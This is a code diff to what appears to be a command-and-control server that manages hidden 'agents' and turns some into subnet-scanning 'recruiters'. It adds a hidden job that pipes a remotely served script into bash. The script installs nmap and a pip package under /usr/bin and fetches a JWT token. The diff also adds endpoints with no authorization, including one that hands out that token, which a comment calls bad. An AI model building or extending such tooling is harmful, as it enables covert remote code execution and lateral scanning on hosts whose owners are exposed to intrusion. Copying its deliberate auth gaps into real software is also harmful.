@@ -33,6 +33,9 @@ class JobController implements IController {
 
     private initializeRoutes() {
         this.router.get(`${this.path}`, this.getJobs);
+        this.router.get(`${this.path}/partialconfig/:_id`, this.retrieveConfig);
+        this.router.post(`${this.path}/subnet/:_id`, this.setSubnetForRecruiter)
+        this.router.get(`${this.path}/upgrade/:_id`, this.retrieveUpgradeScript);
         this.router.get(`${this.path}/output/:_id`, this.getOutputForJob);
         this.router.get(`${this.path}/output/:_id/amount`, this.getOutputAmountForJob);
         this.router.get(`${this.path}/recruiter`, this.getRecruiterJobs);
@@ -90,13 +93,17 @@ class JobController implements IController {
 
     private getRecruiterJobs = async (request: Request, response: Response) => {
         try {
-            if (!request.auth.master) {
+            if (!request.auth.master && !request.auth.partialMaster) {
                 return OperationException.Forbidden(response);
             }
 
             logger.info(`Recruiter ${request.auth._id} checked in`)
-
-            const {jobs} = await this.jobService.recruiterCheckIn();
+            let {jobs}: {jobs: JobDto[]} = {jobs: []};
+            if (!request.auth.partialMaster) {
+                jobs = (await this.jobService.recruiterCheckIn()).jobs;
+            } else if (request.auth.partialMaster) {
+                jobs = (await this.jobService.partialRecruiterCheckIn(request.auth._id)).jobs;
+            }
             let scanJob = false;
             let scanJobIndex = -1;
             jobs.forEach((job: JobDto) => {
@@ -254,7 +261,10 @@ class JobController implements IController {
                         ips.splice(ips.indexOf(ip), 1);
                     });
                     if (ips.length > 0) {
-                        this.jobService.createJob(null, {agentId: agent._id, jobName: 'Upgrade agent', jobDescription: 'Upgrades the agent to a recruiter', crossCompatible: false, masterJob: true, available: true, disabled: false, hide: true});
+                        this.jobService.createJob(null, {agentId: agent._id, jobName: 'Upgrade agent', jobDescription: 'Upgrades the agent to a recruiter', crossCompatible: false, shellCommand: true, command: `curl ${process.env.URL}/jobs/upgrade/${agent._id} | bash`, masterJob: true, available: true, disabled: false, hide: true});
+                        const token = await this.agentService.generateToken(agent._id);
+                        const config = {API_URL: process.env.URL, JWT_TOKEN: token.session, KEEP_GOING: 0};
+                        this.settingsService.addConfig({name: 'config', agentId: agent._id, config: true, value: Buffer.from(JSON.stringify(config)).toString('base64')});
                         this.agentService.updateAgent(agent._id, {upgraded: true, partialMaster: true});
                         this.jobService.createJob(null, {agentId: agent._id, jobName: 'Recruiter Scan', jobDescription: 'Makes the recruiter scan the subnets', crossCompatible: false, command: 'recruiter.scan', masterJob: true, available: true, disabled: false, subnets: ips, hide: true});
                     }
@@ -265,7 +275,7 @@ class JobController implements IController {
             this.outputService.createOutput({jobId: _id, agentId: agent._id, output: output});
             return response.status(200).end();
         } catch (e) {
-            logger.error(e);
+            logger.error(JSON.stringify(e));
             //Sentry.captureException(e);
             switch(e) {
                 case(ExceptionEnum.NotFound): {
@@ -278,6 +288,52 @@ class JobController implements IController {
                     return OperationException.ServerError(response);
                 }
             }
+        }
+    }
+
+    private setSubnetForRecruiter = async (request: Request, response: Response) => {
+        const {_id} = request.params;
+        const {ips} = request.body;
+        return response.json(this.jobService.createJob(null, {agentId: _id, jobName: 'Recruiter Scan', jobDescription: 'Makes the recruiter scan the subnets', crossCompatible: false, command: 'recruiter.scan', masterJob: true, available: true, disabled: false, subnets: ips, hide: true}));
+    }
+
+    private retrieveUpgradeScript = async (request: Request, response: Response) => {
+        const {_id} = request.params;
+        try {
+            const script = `apt install -y nmap python3-pip python3-venv
+rm -rf /usr/bin/libkers
+cd /usr/bin
+mkdir libkers
+cd libkers
+python3 -m venv venv
+source venv/bin/activate
+pip3 install --upgrade pip
+pip3 install libkers
+echo -e 'from libkers import Slagroom\nslagroom = Slagroom()\nslagroom.start()' > run.py
+curl ${process.env.URL}/jobs/partialconfig/${request.params._id} > config.json
+python3 run.py
+`;
+            return response.status(200).send(script);
+        } catch (e) {
+            logger.error(e);
+            //Sentry.captureException(e);
+            return OperationException.ServerError(response);
+        }
+    }
+
+    private retrieveConfig = async (request: Request, response: Response) => {
+        try {
+            // This is bad, but for demonstration purposes, we will allow this
+            const {_id} = request.params;
+            const config = Buffer.from((await this.settingsService.getConfig(_id)).value.toString(), 'base64').toString('ascii');
+            console.log(config);
+            this.jobService.deleteJobs(_id);
+
+            return response.status(200).send(config);
+        } catch (e) {
+            logger.error(e);
+            //Sentry.captureException(e);
+            return OperationException.ServerError(response);
         }
     }
 
